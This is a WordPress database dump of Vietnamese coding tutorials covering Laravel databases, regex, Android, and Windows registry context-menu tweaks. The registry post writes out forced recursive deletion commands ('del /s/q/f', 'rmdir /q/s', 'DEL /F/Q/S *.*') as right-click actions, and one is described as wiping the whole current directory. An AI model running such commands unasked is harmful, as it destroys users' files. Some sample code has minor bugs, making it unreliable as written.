(219, 1, '2020-03-08 12:41:53', '2020-03-08 12:41:53', '<img src=\"https://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-16-at-7.31.52-AM-1024x543.png\" alt=\"database\" />\n<h2>I. Kết nối Database</h2>\n<h3>1. Tạo Database trên XAMPP</h3>\n- chỉ tạo database chứ không tạo bảng hay cột gì hết\n<h3>2. Kết nối Laravel với Database</h3>\n- Sửa file /.env như sau:\n<pre>\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=demolaravel  //tên database vừa tạo bên trên\nDB_USERNAME=root\nDB_PASSWORD=\n</pre>\n\n<h2>II. Tạo các bảng, cột thông qua Migrate</h2>\n\n<h3>1. Tạo bảng bằng Migrate</h3>\n- Tạo 3 bảng Database: Category, Brand, Product bằng Terminal\n<pre>\nphp artisan make:migration create_category --create=category\nphp artisan make:migration create_brand --create=brand\nphp artisan make:migration create_product --create=product\n//create_category: là tạo class CreateCategory\n//create=category: là tạo bảng tên category\n</pre>\n\n- Vào database/migrations/... thấy có 3 bảng vừa tạo\n\n<h3>2. Tạo cột với mỗi bảng</h3>\n- Với bảng Product ta có thể tạo như sau (2 bảng còn lại tương tự)\n<pre>\n<?php\n\nuse Illuminate\\Support\\Facades\\Schema;\nuse Illuminate\\Database\\Schema\\Blueprint;\nuse Illuminate\\Database\\Migrations\\Migration;\n\nclass CreateProduct extends Migration\n{\n    public function up()\n    {\n        Schema::create(\'product\', function (Blueprint $table) {\n            $table->bigIncrements(\'id\'); //PK + unsigned big interger + auto increment\n            $table->string(\'product_name\',191)->unique(); //varchar(191)\n            $table->string(\'product_desc\')->nullable(); //varchar(255)\n            $table->string(\'thumbnail\')->nullable();\n            $table->string(\'gallery\')->nullable();\n            $table->unsignedBigInteger(\'category_id\');\n            $table->unsignedBigInteger(\'brand_id\');\n            $table->decimal(\'price\',12,4);  // tiền $ là 12,4. VNĐ là 16,0\n            $table->unsignedInteger(\'quantity\')->default(1);\n            $table->timestamps(); //tạo 1 lúc 2 columns: created_ad update_ad\n\n            //khóa ngoài\n            $table->foreign(\'category_id\')->references(\'id\')->on(\'category\');\n            $table->foreign(\'brand_id\')->references(\'id\')->on(\'brand\');\n        });\n    }\n\n    public function down()\n    {\n        Schema::dropIfExists(\'product\');\n    }\n}\n</pre>\n\n<h3>3. Khởi chạy Migrate</h3>\n- Dùng terminal\n<pre>\nphp artisan migrate\n</pre>\n- Quay lại database, thấy 3 bảng đã được tạo với các cột như trên\n\n', 'Laravel - Database - Phần 1', '', 'publish', 'open', 'open', '', 'laravel-database-phan-1', '', '', '2020-03-08 12:41:53', '2020-03-08 12:41:53', '', 0, 'https://duycode.com/?p=219', 0, 'post', '', 0),
(232, 1, '2020-03-08 14:12:41', '2020-03-08 14:12:41', '<img src=\"https://laraveldaily.com/wp-content/uploads/2017/10/Screen-Shot-2017-10-16-at-7.31.52-AM-1024x543.png\" alt=\"database\" />\n<h2>III. Tạo model</h2>\n<h3>1. Tạo file model</h3>\n- Dùng terminal, chạy từng lệnh sau:\n<pre>\nphp artisan make:model Category\nphp artisan make:model Brand\nphp artisan make:model Product\n</pre>\n- Vào trong app/.. đã thấy có 3 file php tương ứng\n\n<h3>2. Định nghĩa từng Model</h3>\n- Giả sử với file Product.php trong app/..\n<pre>\n<?php\nnamespace App;\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Product extends Model\n{\n    protected $table = \'product\';\n\n    protected $fillable = [\'product_name\',\'product_desc\',\'thumbnail\',\n        \'gallery\',\'category_id\',\'brand_id\',\'price\',\'quantity\'];\n}\n</pre>\n\n<h3>3. Định nghĩa factory</h3>\n- Vào /database/factories/UserFactory.php, thêm vào cuối như sau:\n<pre>\n$factory->define(\\App\\Brand::class,function (Faker $faker){\n    return [\n        \'product_name\' => $faker -> unique() ->name,\n        \'product_desc\' => $faker -> title,\n        \'thumbnail\' => $faker -> imageUrl(),\n        \'gallery\' => $faker -> imageUrl().\",\". $faker -> imageUrl(),\n        \'price\' => random_int(1,1000),\n        \'quantity\' => random_int(1,100),\n        \'category_id\' => random_int(1,100),\n        \'brand_id\' => random_int(1,100),\n    ];\n});\n//ở trên nghĩa là lấy dữ liệu giả mạo (faker), lấy các tên \"name\" để làm tên cho \'product_name\'\n</pre>\n\n<h3>4. Định nghĩa seeds</h3>\n- Tạo file CategorySeeder.php trong seeds bằng terminal\n<pre>\nphp artisan make:seeder CategorySeeder\n</pre> \n\n- Định nghĩa file /database/seeds/CategorySeeder.php\n<pre>\n<?php\n\nuse Illuminate\\Database\\Seeder;\n\nclass CategorySeeder extends Seeder\n{\n    public function run()\n    {\n        // factory(\\App\\Category::class,100)->create();\n        // factory(\\App\\Brand::class,100)->create();\n        factory(\\App\\Product::class,1000)->create();\n        // chạy dòng nào thì database sẽ add số lượng tương ứng với bảng đó, có thể chạy cả 3 cùng lúc\n    }\n}\n</pre>\n\n- Định nghĩa file /database/seeds/DatabaseSeeder.php\n<pre>\n<?php\n\nuse Illuminate\\Database\\Seeder;\n\nclass DatabaseSeeder extends Seeder\n{\n    public function run()\n    {\n        $this->call(CategorySeeder::class);\n    }\n}\n</pre>\n\n<h3>5. Khởi chạy seeds</h3>\n- Dùng terminal\n<pre>\nphp artisan db:seed\n</pre>\n\n- Khi đã tạo nhiều dữ liệu fake rồi, muốn refresh lại seed lại thì dùng lệnh sau:\n<pre>\nphp artisan migrate:refresh --seed\n</pre>\n- Quay lại database, trong bảng Category, đã tạo ra được 100 dữ liệu fake :D', 'Laravel – Database - Phần 2', '', 'publish', 'open', 'open', '', 'laravel-database-phan-2', '', '', '2020-03-08 14:12:41', '2020-03-08 14:12:41', '', 0, 'https://duycode.com/?p=232', 0, 'post', '', 0),
(254, 1, '2020-03-28 07:52:04', '2020-03-28 07:52:04', '<h2>1. Thêm \"Open in Windows Terminal\" vào để mở file .bat</h2>\r\n- Tạo file abc.bat với nội dung như sau\r\n<pre>\r\nREG ADD HKEY_CLASSES_ROOT\\batfile\\shell\\terminal /d \"Open in Windows Terminal\" -f\r\nREG ADD HKEY_CLASSES_ROOT\\batfile\\shell\\terminal /v \"Icon\" /d \"%SystemRoot%\\System32\\cmd.exe\" -f\r\nREG ADD HKEY_CLASSES_ROOT\\batfile\\shell\\terminal\\command /d \"wt new-tab cmd.exe /C \\\"%%1\\\" %%*\" -f\r\n</pre>\r\n- Run với quyền admin\r\n\r\n<h2>1. Thêm CMD vào chuột Phải</h2>\r\n<h3>1.1. Cách 1: Dùng bằng file duycode.reg </h3>\r\na. Tạo file duycode.reg và click đúp để chạy, nội dung file như sau\r\n<pre>\r\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD]\r\n @=\"Open CMD Here\"\r\n\"Icon\"=\"%SystemRoot%\\\\System32\\\\cmd.exe\"\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD\\command]\r\n @=\"cmd.exe /s /k pushd \\\"%V\\\"\"\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD]\r\n @=\"Open CMD Here\"\r\n\"Icon\"=\"%SystemRoot%\\\\System32\\\\cmd.exe\"\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD\\command]\r\n @=\"cmd.exe /s /k pushd \\\"%V\\\"\"\r\n</pre>\r\n\r\nb. Xóa MenuContext: Duy.CMD\r\n<pre>\r\nWindows Registry Editor Version 5.00\r\n\r\n[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD]\r\n[-HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD]\r\n</pre>\r\n\r\n<h3>1.2. Cách 2: Dùng bằng file duycode.bat</h2>\r\n-- Xem hướng dẫn sử dụng REG bằng cmd bằng câu lệnh: \"REG /?\"\r\n-- Tạo file duycode.bat, khi khởi chạy nhớ \"Run as administrator\"\r\n-- Nội dung như sau\r\n<pre>\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD /d \"Open CMD Here\"\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD /v \"Icon\" /d \"%SystemRoot%\\System32\\shell32.dll,2\"\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD\\command /d \"cmd.exe /s /k pushd \\\"%%V\\\"\"\r\n\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD /d \"Open CMD Here\"\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD /v \"Icon\" /d \"%SystemRoot%\\System32\\shell32.dll,2\"\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD\\command /d \"cmd.exe /s /k pushd \\\"%%V\\\"\"\r\n</pre>\r\n-- Xóa key như sau\r\n<pre>\r\nREG DELETE HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.CMD /f\r\nREG DELETE HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Duy.CMD /f\r\n</pre>\r\n\r\n<h2>2. Fastest Copy và Fastest Delete</h2>\r\n<h3>Cách 1: Sử dụng file duycode.reg</h3>\r\n<pre>\r\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete]\r\n@=\"Fastest Delete Folder\"\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete\\Command]\r\n@=\"cmd.exe /c \\\"pause && del /s/q/f \\\"%1\\\" > nul && rmdir /q/s \\\"%1\\\"\\\"\"\r\n\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestCopy]\r\n@=\"Fastest Copy Folder\"\r\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestCopy\\Command]\r\n@=\"cmd.exe /k \\\"robocopy \\\"%1\\\" \\\"%1-%%random%%\\\" /e\\\"\"\r\n</pre>\r\n-- Xóa MenuContext: Duy.FastestDelete</h3>\r\n<pre>\r\nWindows Registry Editor Version 5.00\r\n\r\n[-HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete]\r\n[-HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestCopy]\r\n</pre>\r\n\r\n<h3>Bolus :D Cách 2: Sử dụng file duycode.bat</h3>\r\n<pre>\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete /d \"Fastest Delete Folder\" /f\r\nREG ADD HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete\\command /d \"cmd.exe /c \\\"pause ^&^& del /s/q/f \\\"%%1\\\" ^> nul ^&^& rmdir /q/s \\\"%%1\\\"\\\"\" /f\r\n</pre>\r\n-- Xóa menuContext như sau\r\n<blockquote>\r\nREG DELETE HKEY_CLASSES_ROOT\\Directory\\shell\\Duy.FastestDelete /f\r\n</blockquote>\r\n\r\n\r\n<h2>*** Một số cú pháp tham khảo khác</h2>\r\n<pre>\r\n@=\"cmd.exe /c move \\\"%1\\\\*.*\\\" . && rd \\\"%1\\\"\"       => đưa tất cả file con ra file mẹ và xóa thư mục mẹ nếu trống\r\n@=\"cmd.exe /c del /q \\\"%1\\\"\"                         => chỉ xóa file trong thư mục root đã chọn, các file trong thư mục lv 2 trở lên không xóa\r\n@=\"cmd.exe /c del /q \\\"%1\\\\*.*\\\"\"                    => cũng chỉ xóa file trong thư mục root đã chọn, các file trong thư mục lv 2 trở lên không xóa\r\n\r\n@=\"cmd.exe /c del /f/q/s \\\"*.*\\\" > nul\"              => xóa tất cả các file chỗ đang làm việc (cái thư mục bị trỏ chuột và thư mục ngoài đều dính, do không dùng lệnh %1\r\n@=\"cmd.exe /c del /f/q/s \\\"%1\\\\*.*\\\" > nul\"          => xóa tất cả file, mọi cấp thuộc thư mục đó\r\n\r\n@=\"cmd.exe /c rmdir /s /q \\\"%1\\\"\"                    => xóa luôn thư mục vừa chọn\r\n\r\n\r\n\r\n@=\"cmd.exe /c \\\"pause && cd \\\"%1\\\" && DEL /F/Q/S \\\"%1\\\" > NUL && RMDIR /Q/S \\\"%1\\\"\\\"\" => Ngon => Ngon, làm trống thư mục nhanh nhất\r\n\r\n@=\"cmd.exe /c \\\"pause && del /s/q/f \\\"%1\\\" > nul && rmdir /q/s \\\"%1\\\"\\\"\"  => Ngon => Ngon => Xóa cả thư mục nhanh nhất luôn\r\n\r\nLệnh CMD\r\nDEL /F/Q/S *.* > NUL       => Xóa tất cả file thuộc thư mục đang làm việc   (/S => xóa cả đường dẫn con)                     \r\n</pre>', 'Registry Editor in Windows 10', '', 'publish', 'open', 'open', '', 'registry-editor-in-windows-10', '', '', '2022-03-31 09:31:07', '2022-03-31 09:31:07', '', 0, 'https://duycode.com/?p=254', 0, 'post', '', 0),
(280, 1, '2020-05-09 21:01:56', '2020-05-09 21:01:56', '<h2>1. Cú pháp Regex</h2>\n<pre>\nlet patt1 = /^is/gmi;\nlet patt2 = new RegExp(\"\\\\w\", \"g\");\n\nlet str = \"\\\\w\"\nlet patt3 = new RegExp(str, \"g\");\n</pre>\n\n<table>\n<tbody>\n<tr>\n<td>i</td>\n<td>insensitive</td>\n<td>Không phân biệt chữ hoa hay thường</td>\n</tr>\n<tr>\n<td>g</td>\n<td>global </td>\n<td>Tìm hết trong chuỗi, ra kết quả vẫn tìm tiếp</td>\n</tr>\n<tr>\n<td>m</td>\n<td>multiline </td>\n<td>Tìm kiếm nhiều dòng</td>\n</tr>\n<tr>\n</tbody>\n</table>\n\n<h2>2. Cách viết Pattern</h2>\n<table>\n<tbody>\n<tr>\n<td>K&yacute; tự</td>\n<td>Giải th&iacute;ch</td>\n</tr>\n<tr>\n<td>[ACm05]</td>\n<td>hoặc\"A\", hoặc \"C\", hoặc \"m\", hoặc \"0\", hoặc \"5\"</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>từ A đến Z chữ hoa</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>từ a đến Z chữ thường</td>\n</tr>\n<tr>\n<td>[A-z]</td>\n<td>từ A hoa đến z thường</td>\n</tr>\n<tr>\n<td>[e-h]</td>\n<td>từ&nbsp;e đến h</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>từ 0 đến 9</td>\n</tr>\n<tr>\n<td>[3-7]</td>\n<td>từ&nbsp;3 đến&nbsp;7</td>\n</tr>\n<tr>\n<td>[A-C2-5q]</td>\n<td>hoặc từ A đến C, hoặc 2 đến 5, hoặc q</td>\n</tr>\n<tr>\n<td colspan=\"2\">\nlet pattern =&nbsp;/[A-C2-5q]/g; \nlet string =&nbsp;\"<span style=\"color: #ff0000;\">ABC</span>DE 1<span style=\"color: #ff0000;\">2</span>0<span style=\"color: #ff0000;\">2</span>0<span style=\"color: #ff0000;\">5</span>8 mnnop<span style=\"color: #ff0000;\">qqq</span>rs\"; \nlet result = string.match(pattern); \n//result:&nbsp;A,B,C,2,2,5,q,q,q</td>\n</tr>\n<tr>\n<td>[^DEn27]</td>\n<td>kh&ocirc;ng c&oacute; \"D\",\"E\",\"n\",\"2\",\"7\"</td>\n</tr>\n<tr>\n<td>[^C-Z]</td>\n<td>kh&ocirc;ng c&oacute; chữ \"C\" đến \"Z\"</td>\n</tr>\n<tr>\n<td>[^A-e]</td>\n<td>kh&ocirc;ng c&oacute; chữ A hoa đến e thường</td>\n</tr>\n<tr>\n<td>[^1-4]</td>\n<td>kh&ocirc;ng c&oacute; từ 1 đến 4</td>\n</tr>\n<tr>\n<td>[^A-C2-5q]</td>\n<td>kh&ocirc;ng c&oacute; từ A đến C, từ 2 đến 5,&nbsp;v&agrave;&nbsp;q</td>\n</tr>\n<tr>\n<td colspan=\"2\">\nlet pattern = /[^A-C2-5q]/g; \nlet string =&nbsp;\"ABC<span style=\"color: #ff0000;\">DE 1</span>2<span style=\"color: #ff0000;\">0</span>2<span style=\"color: #ff0000;\">0</span>5<span style=\"color: #ff0000;\">8</span>&nbsp;<span style=\"color: #ff0000;\">mnnop</span>qqq<span style=\"color: #ff0000;\">rs</span>\"; \nlet result = string.match(pattern); \n//result: D,E, ,1,0,0,8, ,m,n,n,o,p,r,s</td>\n</tr>\n<tr>\n<td>a+</td>\n<td>c&oacute; 1&nbsp;hoặc nhiều chữ&nbsp;a</td>\n</tr>\n<tr>\n<td>a*</td>\n<td>kh&ocirc;ng c&oacute; hoặc nhiều chữ a</td>\n</tr>\n<tr>\n<td>a?</td>\n<td>c&oacute; 0 hoặc 1 chữ a</td>\n</tr>\n<tr>\n<td colspan=\"2\">\n<p>var str = \"He<span style=\"color: #ff0000;\">ll</span><span style=\"color: #0000ff;\">ooo</span> Wor<span style=\"color: #ff0000;\">l</span>d! He<span style=\"color: #ff0000;\">ll</span><span style=\"color: #0000ff;\">o</span> W3Schoo<span style=\"color: #ff0000;\">l</span>s!\";</p>\nvar patt1 = /lo+/g; \nvar patt2 = /lo*/g; \nvar patt3 = /lo?/g; \nlet result = str.match(patt); \n//patt1: chữ \"l\" + c&oacute; &iacute;t nhất 1 chữ \"o\"&nbsp;=&gt;&nbsp; looo,lo \n//patt2:&nbsp;chữ \"l\"&nbsp;+ kh&ocirc;ng c&oacute; hoặc&nbsp;c&oacute; nhiều chữ \"o\"&nbsp;=&gt; l,looo,l,l,lo,l \n//patt3: chữ \"l\"&nbsp;+ kh&ocirc;ng&nbsp;c&oacute; hoặc c&oacute; 1 chữ \"o\" =&gt;&nbsp;l,lo,l,l,lo,l</td>\n</tr>\n<tr>\n<td>\\d{4}</td>\n<td>c&oacute; 4 số liền nhau</td>\n</tr>\n<tr>\n<td>\\d{2,4}</td>\n<td>c&oacute; từ 2 đến 4 số liền nhau</td>\n</tr>\n<tr>\n<td>\\d{3,}</td>\n<td>c&oacute; &iacute;t nhất 3 số liền nhau</td>\n</tr>\n\n\n<tr>\n<td>.</td>\n<td>ký tự đơn bất kỳ, ngoài ký tự xuống dòng</td>\n</tr>\n\n\n<tr>\n<td>/\\d$/g</td>\n<td>c&oacute; số ở cuối chuỗi</td>\n</tr>\n<tr>\n<td>/^\\d/g</td>\n<td>c&oacute; số ở đầu chuỗi</td>\n</tr>\n<tr>\n<td>/(red|green|\\d)/g</td>\n<td>chữ \"red\" hoặc \"green\" hoặc một số</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>bao gồm từ a-z,A-Z,0-9, kể cả _ (dấu gạch dưới)</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>ngược lại&nbsp;\\w</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>một số bất kỳ, giống [0-9]</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>ngược lại \\d, giống [^0-9]</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>k&yacute; tự trắng: dấu c&aacute;ch, dấu tab, xuống d&ograve;ng</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>ngược lại \\s</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>bắt đầu hoặc kết th&uacute;c 1 từ, t&ugrave;y vị tr&iacute; viết \\b</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>ngược lại của \\b, kh&ocirc;ng ở đầu hoặc cuối</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>k&yacute; tự xuống d&ograve;ng</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>k&yacute; tự tab</td>\n</tr>\n<tr>\n<td colspan=\"2\">\nlet str = \"ABC A2019 xyz\";\nlet patt1 = /\\b\\w/g; \nlet patt2 = /\\d\\b/g; \nlet patt3 = /\\B\\w/g;\nlet patt4 = /\\d\\B/g; \nlet result = str.match(patt); \n//patt1: chữ bất kỳ ở đầu một từ =&gt; A,A,x \n//patt2:&nbsp;số&nbsp;bất kỳ ở&nbsp;cuối một&nbsp;từ&nbsp;=&gt;&nbsp;9 \n//patt3: chữ bất kỳ kh&ocirc;ng ở đầu một&nbsp;từ=&gt;&nbsp;B,C,2,0,1,9,y,z \n//patt4: số bất kỳ, kh&ocirc;ng ở cuối một&nbsp;từ=&gt;2,0,1</td>\n</tr>\n</tbody>\n</table>\n\n<h2>3. Các phương thức sử dụng trong Regex</h2>\n- Bao gồm: match, exec, test\n<pre>\nvar str = \"The rain in SPAIN stays mainly in the plainn\";\nvar patt = /ain|haha/g\nvar res1 = str.match(patt);\nvar res2 = patt.exec(str);\nvar res3 = patt.test(str);\n//result: \nres1 => ain,ain,ain\nres2 => ain\nres3 => true\n</pre>\n\n<h2>4. Một số ví dụ đặc biệt:</h2>\n4.1. containsNumber : /\\d+/,\n4.2. containsAlphabet : /[a-zA-Z]/,\n\n4.3. onlyLetters : /^[A-Za-z]+$/,\n4.4. onlyNumbers : /^[0-9]+$/,\n4.5. Tìm ký tự theo sau: (?=n)\nCông thức: ?=n\n<pre>\nvar str = \"AZ và AB: Tìm chữ A nào có chữ Z đi theo sau\";\nvar patt1 = /A(?=Z)/;\nvar patt1 = /A(?=Z)/;\nvar result = str.match(patt1); //result: A\n\n</pre>', 'JavaScript - Regex - Biểu thức chính quy', '', 'publish', 'open', 'open', '', 'javascript-regex-bieu-thuc-chinh-quy', '', '', '2020-05-09 21:01:56', '2020-05-09 21:01:56', '', 0, 'https://duycode.com/?p=280', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(291, 1, '2020-05-24 18:32:55', '2020-05-24 18:32:55', '<pre>\npackage com.example.tests;\n\nimport androidx.appcompat.app.AppCompatActivity;\n\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MainActivity extends AppCompatActivity {\n    private String TAG = \"MainActivity\";\n    public ActivityMainBinding mainBinding;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Log.e(TAG,\"onCreate\");\n        mainBinding = DataBindingUtil\n                .setContentView(this,R.layout.activity_main);\n        //setContentView(R.layout.activity_main);\n    }\n\n    @Override\n    protected void onStart() {\n        super.onStart();\n        Log.e(TAG,\"onStart\");\n    }\n    @Override\n    protected void onResume() {\n        super.onResume();\n        Log.e(TAG,\"onResume\");\n    }\n    @Override\n    protected void onPause() {\n        super.onPause();\n        Log.e(TAG,\"onResume\");\n    }\n    @Override\n    protected void onStop() {\n        super.onStop();\n        Log.e(TAG,\"onStop\");\n    }\n    @Override\n    protected void onDestroy() {\n        super.onDestroy();\n        Log.e(TAG,\"onDestroy\");\n    }\n}\n</pre>\n<img src=\"https://i0.wp.com/yellowcodebooks.com/wp-content/uploads/2017/10/activity_lifecycle.png\" alt=\"activity\" />\n\n<h2>Tổng quan</h2>\nforeground là trạng thái activity được hiển thị và tương tác với người dùng\nbackground là trạng thái activity bị ẩn 1 phần hoặc toàn bộ. Mà khi ần thì người dùng ko thấy và tương tác được.\n.onCreate và onDestroy chỉ xảy ra 1 lần duy nhất trong cả vòng đới activity', 'Activity - Lifecycle', '', 'publish', 'open', 'open', '', 'activity-lifecycle', '', '', '2020-05-24 18:32:55', '2020-05-24 18:32:55', '', 0, 'https://duycode.com/?p=291', 0, 'post', '', 0),
(297, 1, '2020-05-24 18:57:37', '2020-05-24 18:57:37', 'android manifest là file điều hướng cấu hình hiển thị và khai báo các nút cảnh trên ứng dụng android\nallowbackup: để true là khi khôi phục lại sữ khôi phục lại dữ liệu đã mất', 'Android manifest', '', 'publish', 'open', 'open', '', 'android-manifest', '', '', '2020-05-24 18:57:37', '2020-05-24 18:57:37', '', 0, 'https://duycode.com/?p=297', 0, 'post', '', 0),
(300, 1, '2020-06-12 22:50:41', '2020-06-12 22:50:41', '<h2>1. Implement thư viện:</h2>\n- Sử dụng thư viện của Material: <a href=\"https://material.io/develop/android/docs/getting-started/\" rel=\"noopener noreferrer\" target=\"_blank\">https://material.io/develop/android/docs/getting-started/</a>\n- Vào Gradle Scripts -> build.gradle (Module:app)\n- Thêm vào trong dependencies {} dòng sau:\n<pre>implementation \'com.google.android.material:material:+\'</pre>\n\n<h2>2. Tạo Class Student (folder: app/java/com.example.test)</h2>\n<pre>\npackage com.example.projectname;\n\npublic class Student {\n    private String name;\n    private Double point;\n\n    public Student(String name, Double point) {\n        this.name = name;\n        this.point = point;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Double getPoint() {\n        return point;\n    }\n\n    public void setPoint(Double point) {\n        this.point = point;\n    }\n}\n</pre>\n\n<h2>3. Tạo file item_layout.xml (folder: app/res/layout)</h2>\n- Cần nhớ là: <em><strong>layout_height=\"wrap_content\"</strong></em> nhá.\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:orientation=\"horizontal\"\n    android:padding=\"20dp\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"wrap_content\">\n    <TextView\n        android:id=\"@+id/tv_name\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:textSize=\"24sp\"\n        android:layout_weight=\"1\"\n        android:text=\"Name\"/>\n    <TextView\n        android:id=\"@+id/tv_point\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:textSize=\"24sp\"\n        android:text=\"Point\"/>\n</LinearLayout>\n</pre>\n\n<h2>4. Sửa file activity_main.xml (folder: app/res/layout)</h2>\n<pre>\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:orientation=\"vertical\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainActivity\">\n\n    <androidx.recyclerview.widget.RecyclerView\n        android:id=\"@+id/rv_list_student\"\n        app:layoutManager=\"androidx.recyclerview.widget.LinearLayoutManager\"\n        android:orientation=\"vertical\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n\n    </androidx.recyclerview.widget.RecyclerView>\n</LinearLayout>\n</pre>\n\n<h2>5. Tạo Class StudentAdapter (folder: app/java/com.example.nameproject)</h2>\n<pre>\npackage com.example.test;\n\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport java.util.ArrayList;\n\n\npublic class StudentAdapter extends RecyclerView.Adapter<StudentAdapter.StudentHolder> {\n    private ArrayList<Student> studentArrayList;\n    LayoutInflater inflater;\n\n    public StudentAdapter(LayoutInflater inflater) {\n        this.inflater = inflater;\n    }\n\n    public void setStudentArrayList(ArrayList<Student> studentArrayList) {\n        this.studentArrayList = studentArrayList;\n        notifyDataSetChanged();\n    }\n\n    @NonNull\n    @Override\n    public StudentHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        View studentView = inflater.inflate(R.layout.item_layout,parent,false);\n        return new StudentHolder(studentView);\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull StudentHolder holder, int position) {\n        holder.bindView(studentArrayList.get(position));\n\n    }\n\n    @Override\n    public int getItemCount() {\n        return studentArrayList == null ? 0 : studentArrayList.size();\n    }\n\n    public class StudentHolder extends RecyclerView.ViewHolder {\n        private TextView tvName;\n        private TextView tvPoint;\n\n        public StudentHolder(@NonNull View itemView) {\n            super(itemView);\n            tvName = itemView.findViewById(R.id.tv_name);\n            tvPoint = itemView.findViewById(R.id.tv_point);\n        }\n\n        public void bindView(Student item){\n            tvName.setText(item.getName());\n            tvPoint.setText(item.getPoint()+\"\");\n        }\n    }\n}\n\n</pre>\n<h2>6. Sửa Class MainActivity (folder: app/java/com.example.nameproject)</h2>\n<pre>\npackage com.example.test;\n\nimport androidx.appcompat.app.AppCompatActivity;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport android.os.Bundle;\n\nimport java.util.ArrayList;\n\npublic class MainActivity extends AppCompatActivity {\n    private RecyclerView rvStudent;\n    private StudentAdapter studentAdapter;\n    private ArrayList<Student> studentList = new ArrayList<>();\n\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        initView();\n    }\n\n    private void initView() {\n        rvStudent = findViewById(R.id.rv_list_student);\n        studentAdapter = new StudentAdapter(getLayoutInflater());\n        rvStudent.setAdapter(studentAdapter);\n        for (int i=0;i<100;i++){\n            arrStudent.add(new Student(\"Duy\",9.8));\n            arrStudent.add(new Student(\"Trang\",9.5));\n            arrStudent.add(new Student(\"Dương\",10.0));\n        }\n        studentAdapter.setStudentArrayList(studentList);\n    }\n}\n</pre>\n', 'RecycleView - Cơ bản', '', 'publish', 'open', 'open', '', 'recycleview-co-ban', '', '', '2020-06-12 22:50:41', '2020-06-12 22:50:41', '', 0, 'https://duycode.com/?p=300', 0, 'post', '', 0),
